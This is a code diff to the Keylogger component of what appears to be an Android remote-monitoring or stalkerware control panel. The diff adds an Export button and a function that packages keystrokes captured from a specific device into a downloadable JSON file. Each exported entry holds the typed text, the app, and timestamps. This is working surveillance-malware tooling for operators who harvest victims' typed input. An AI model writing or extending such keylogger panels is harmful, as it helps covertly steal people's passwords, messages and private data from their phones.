@@ -8,16 +8,18 @@ import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { 
   Keyboard, Play, Square, Loader2, Search, X, 
-  Package, Type, Clock
+  Package, Type, Clock, Download
 } from "lucide-react";
 import { format, formatDistanceToNow } from "date-fns";
 import { io, Socket } from "socket.io-client";
+import { useLicenseId } from "@/lib/utils/use-license-id";
 
 interface KeyloggerProps {
   device: AndroidDevice;
 }
 
 export default function Keylogger({ device }: KeyloggerProps) {
+  const licenseId = useLicenseId(); // Available for future REST API calls if needed
   const [entries, setEntries] = useState<KeyloggerEntry[]>([]);
   const [loading, setLoading] = useState(false);
   const [isActive, setIsActive] = useState(false);
@@ -266,6 +268,79 @@ export default function Keylogger({ device }: KeyloggerProps) {
     setLastUpdateTime(null);
   };
 
+  const handleExport = () => {
+    if (entries.length === 0) {
+      return;
+    }
+
+    // Format entries with proper date/time formatting
+    const formattedEntries = entries.map((entry) => {
+      let formattedDate: string;
+      try {
+        let date: Date;
+        const ts = entry.timestamp;
+        
+        // Handle Unix timestamp (milliseconds)
+        if (typeof ts === 'number' || (typeof ts === 'string' && /^\d+$/.test(ts))) {
+          const numTimestamp = typeof ts === 'number' ? ts : parseInt(ts, 10);
+          date = numTimestamp.toString().length === 10 
+            ? new Date(numTimestamp * 1000) 
+            : new Date(numTimestamp);
+        } else {
+          date = new Date(ts);
+        }
+        
+        if (isNaN(date.getTime())) {
+          formattedDate = String(ts);
+        } else {
+          formattedDate = format(date, "yyyy-MM-dd HH:mm:ss");
+        }
+      } catch {
+        formattedDate = String(entry.timestamp);
+      }
+
+      return {
+        id: entry.id,
+        type: entry.type,
+        text: entry.text,
+        package_name: entry.package_name,
+        app_name: entry.app_name || null,
+        timestamp: entry.timestamp,
+        formatted_timestamp: formattedDate,
+        date: formattedDate.split(' ')[0],
+        time: formattedDate.split(' ')[1] || null,
+      };
+    });
+
+    // Create export data object
+    const exportData = {
+      device_id: device.id,
+      device_name: device.name || device.id,
+      export_date: format(new Date(), "yyyy-MM-dd HH:mm:ss"),
+      export_timestamp: new Date().toISOString(),
+      total_entries: entries.length,
+      entries: formattedEntries,
+    };
+
+    // Create filename with date and time
+    const now = new Date();
+    const dateTimeStr = format(now, "yyyy-MM-dd_HH-mm-ss");
+    const filename = `keylogger_${device.id}_${dateTimeStr}.json`;
+
+    // Create and download file
+    const blob = new Blob([JSON.stringify(exportData, null, 2)], {
+      type: "application/json",
+    });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement("a");
+    link.href = url;
+    link.download = filename;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+  };
+
   const formatTimestamp = (timestamp: string | number): string => {
     try {
       let date: Date;
@@ -372,15 +447,26 @@ export default function Keylogger({ device }: KeyloggerProps) {
               </Button>
             )}
             {entries.length > 0 && (
-              <Button
-                variant="outline"
-                size="sm"
-                onClick={handleClear}
-                className="gap-2"
-              >
-                <X className="h-4 w-4" />
-                Clear
-              </Button>
+              <>
+                <Button
+                  variant="outline"
+                  size="sm"
+                  onClick={handleExport}
+                  className="gap-2"
+                >
+                  <Download className="h-4 w-4" />
+                  Export
+                </Button>
+                <Button
+                  variant="outline"
+                  size="sm"
+                  onClick={handleClear}
+                  className="gap-2"
+                >
+                  <X className="h-4 w-4" />
+                  Clear
+                </Button>
+              </>
             )}
           </div>
         </div>
